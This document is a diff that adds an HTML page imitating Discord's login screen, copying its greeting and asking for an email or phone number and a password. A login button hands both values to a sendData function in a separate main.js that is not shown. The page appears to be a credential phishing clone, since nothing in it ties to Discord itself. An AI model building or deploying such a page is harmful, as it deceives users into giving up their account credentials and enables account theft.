@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Discord Login</title>
+    <link rel="stylesheet" href=".\reset.css">
+    <link rel="stylesheet" href=".\style.css">
+
+</head>
+
+<body>
+    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+    <script src=".\main.js"></script>
+    <div class="login">
+        <div class="form">
+        <h1>Welcome back!</h1>
+        <p class="nice">We're so excited to see you again!</p>
+        <br>
+        <form>
+            <p class="info">EMAIL OR PHONE NUMBER <r>*</r> </p>
+            <input id='Username' type='text' class="input">
+            <br>
+            <p class="info">PASSWORD <r>*</r></p>
+            <form><input id='Password' type='text' class="input">
+            <br>
+        </form>
+        <button class="loginButton" onclick="sendData(document.getElementById('Username').value, document.getElementById('Password').value)">Log
+            In</button>
+        </div>
+    </div>
+</body>
+
+</html>
